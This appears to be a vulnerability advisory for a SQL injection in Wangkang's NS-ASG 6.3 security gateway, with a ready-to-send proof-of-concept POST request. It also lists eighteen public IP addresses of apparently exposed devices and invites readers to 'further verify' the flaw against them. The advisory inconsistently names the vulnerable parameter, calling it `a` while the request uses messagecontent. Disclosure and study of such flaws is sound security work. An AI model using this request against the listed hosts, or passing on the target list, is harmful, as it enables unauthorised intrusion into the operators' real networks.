### Description
Beijing Wangkang Technology Co., Ltd. is a top Cybersecurity vendor of advanced network application layer technologies in China and globally. Their product line includes Internet behavior management, next-generation firewalls, intelligent traffic management, application layer VPNs, and proxy servers.

NS-ASG(Wangkang's application security gateway product) has a SQL injection vulnerability. 

This vulnerability arises when user inputs are not properly validated and sanitized, allowing attackers to embed malicious SQL code within the input fields, which is then executed by the database.

### Affected Components

- NS-ASG 6.3

### Details
URL: /protocol/iscgwtunnel/deleteiscgwrouteconf.php

The variable `$RouteId` is accepted through the variable `messagecontent`. The `$RouteId` is then iterated over and directly inserted into the SQL statement without any validation. This results in an unauthorized SQL injection vulnerability.

<img width="800" alt="image" src="https://github.com/SecureF1sh/findings/assets/171762512/d5e92978-49ed-4fb5-802f-d2eb926a3417">


### Steps to Reproduce

Construct a proof of concept (PoC) as follows to successfully verify that the `a` parameter is vulnerable to SQL injection.
```
POST /protocol/index.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

jsoncontent={"protocolType":"deleteiscgwrouteconf","messagecontent":["1*"]}
```
<img width="800" alt="image" src="https://github.com/SecureF1sh/findings/assets/171762512/b86f03f6-fd7b-4b90-8f89-99e896ac3e53">
<img width="800" alt="image" src="https://github.com/SecureF1sh/findings/assets/171762512/4e98d2a3-83b2-4254-ac4e-9bac429c2d89">

To further verify the existence of SQL Injection vulnerabilities, the following URLs can be used:
```https://60.221.241.51/3g/menu.php
https://1.85.53.53/3g/menu.php
https://115.231.254.66:8001/3g/menu.php
https://59.52.76.22/3g/menu.php
https://112.112.9.21/3g/menu.php
https://117.32.131.184:10001/3g/menu.php
https://111.42.83.27/3g/menu.php
https://60.221.241.55/3g/menu.php
https://218.75.78.54:4443/3g/menu.php
https://111.43.67.136:8443/3g/menu.php
https://119.254.106.62/3g/menu.php
https://111.113.12.226/3g/menu.php
http://59.52.76.22:8080/3g/menu.php
https://61.153.74.10/3g/menu.php
https://124.89.86.75/3g/menu.php
https://223.210.14.6:8081/3g/menu.php
https://111.42.83.27:8443/3g/menu.php
https://113.204.33.194:8443/3g/menu.php
```

### Recommended Mitigation
Restrict parameter inputs to the expected values only.
